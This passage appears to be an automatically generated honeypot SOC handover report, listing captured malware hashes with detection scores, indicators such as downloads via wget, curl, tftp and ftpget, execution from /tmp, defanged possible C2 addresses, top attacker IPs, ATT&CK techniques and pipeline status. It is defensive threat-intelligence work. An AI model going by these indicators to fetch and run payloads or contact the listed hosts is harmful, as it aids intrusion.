| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `bc917f6bbce0845d39c27ee8147a140bf5ab594f50558024f0ec925864ec69c7` | ELF Binary (Linux executable) (MIPS 32-bit) | `bc917f6bbce0845d...` | 30/100 | 🟢 LOW | Not in VT |
| `bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425` | Bash Script | `bcc130d7635ef1ef...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 4 |
| `159.65.233[.]253` | US | DigitalOcean, LLC | **100** ⚠️ | 5 |
| `141.11.88[.]122` | US | Vantiva SA | **100** ⚠️ | 6 |
| `160.119.71[.]92` | NL | Cloud Hosting | **100** ⚠️ | 11 |
| `195.96.139[.]116` | GB | Driftnet Ltd | **100** ⚠️ | 5 |
| `45.205.1[.]42` | BR | VPSVAULT.HOST LTD | **100** ⚠️ | 8 |
| `43.165.170[.]198` | JP | ACEVILLE PTE.LTD. | **100** ⚠️ | 3 |
| `67.220.180[.]114` | US | Host World Net LLC | **100** ⚠️ | 18 |
| `124.226.212[.]169` | CN | CHINANET Guangxi province network | **100** ⚠️ | 50 |
| `195.178.110[.]227` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 43 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 153 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 143 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 21 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 20 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 7 |

---

## 🔕 False Positive Summary (11 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 202 cases |
| Tool 34  | Credential Extractor        | ✅ 167 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 14 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 63 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 11 filtered (5.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 45 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 37 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 143 priority case(s) shown individually · 27 recon entry/entries in table (4 group(s) consolidating 25 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-02T17:53:46Z_
